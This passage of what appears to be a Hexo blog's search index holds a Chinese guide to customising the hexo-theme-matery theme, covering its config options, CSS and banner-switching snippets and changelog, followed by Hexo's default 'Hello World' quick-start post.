这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class=" language-lang-css"><code class="language-lang-css">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */.bg-color {    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);}@-webkit-keyframes rainbow {   /* 动态切换背景颜色. */}@keyframes rainbow {    /* 动态切换背景颜色. */}</code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class=" language-lang-javascript"><code class="language-lang-javascript">$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');</code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本记录"><a href="#版本记录" class="headerlink" title="版本记录"></a>版本记录</h2><ul><li>v1.0.0<ul><li>新增了所有基础功能；</li></ul></li><li>v1.0.1<ul><li>调整 <code>css</code>、<code>js</code> 的文件请求路径在主题的<code>_config.yml</code>中配置，便于你更快捷的配置自己的 CDN；</li><li>新增代码是否折行为可配置，默认为折行；</li><li>默认激活 <code>TOC</code> 功能，并新增为某篇文章关闭 <code>TOC</code> 的 <code>Front-matter</code> 配置选项；</li><li>修复文章滚动时，高亮的目录选项不准确的问题；</li><li><code>IOS</code>下移除搜索框自动获得焦点属性，防止自动获得焦点后导致视图上移；</li></ul></li><li>v1.0.2<ul><li>升级了 <a href="https://materializecss.com/" target="_blank" rel="noopener">Materialize</a> 框架版本为<code>1.0.0</code>，重构和修改了升级过程中的部分文件或问题；</li><li>新增了首页封面的全屏轮播特效，可以将更重要的文章设置到首页轮播中；</li><li>修复首页第一个按钮是中文的问题</li><li>修复了 iPhone 上点击搜索输入获取焦点的问题；</li><li>修复了 iPhone 上输入框获取焦点后页面放大的问题；</li><li>修复一些文章或 UI 显示问题；</li></ul></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> hexo-theme-matery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/09/13/hello-world/"/>
      <url>/2018/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo new "My New Post"</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
